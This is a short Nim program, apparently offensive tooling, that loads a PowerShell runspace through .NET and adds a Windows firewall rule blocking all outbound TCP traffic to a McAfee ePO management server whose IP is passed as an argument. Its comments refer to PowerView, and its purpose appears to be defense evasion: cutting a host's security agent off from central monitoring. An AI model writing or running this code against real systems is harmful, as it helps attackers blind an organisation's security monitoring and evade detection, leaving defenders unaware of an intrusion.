import winim/clr
import sugar
import strformat
import os
import std/enumerate
import strutils


proc execPowerView(command: string) =
  var Automation = load("System.Management.Automation")
  var RunspaceFactory = Automation.GetType("System.Management.Automation.Runspaces.RunspaceFactory")
  var runspace = @RunspaceFactory.CreateRunspace()
  runspace.Open()
  var pipeline = runspace.CreatePipeline()

  # Load the script first and the the PowerView Command
  pipeline.Commands.AddScript(command)

  try:
    var results = pipeline.Invoke()
    for i in countUp(0,results.Count()-1):
        echo results.Item(i)
  except:
    echo "[-] Failed to execute command, aborting"

  echo "[+] Command Executed Successfully"
  runspace.Close()

proc main() =


  var blockString = "New-NetFirewallRule -DisplayName \"Block McAfee\" -Name \"Block McAfee\" -Direction Outbound -RemoteAddress {{HOSTNAME}} -Enabled True -Protocol TCP -Action Block"

  var args = commandLineParams()
  if len(args) == 0:
    echo "usage: blockfw.exe <epo-host-ip>"
    return
  let epoHost = args[0]

  echo fmt"Blocking all outgoing traffic to `{epoHost}`"
  blockString = blockString.replace("{{HOSTNAME}}", epoHost)
  echo fmt"[DBG] Command: `{blockString}`"
  execPowerView(blockString)


if isMainModule:
  main()
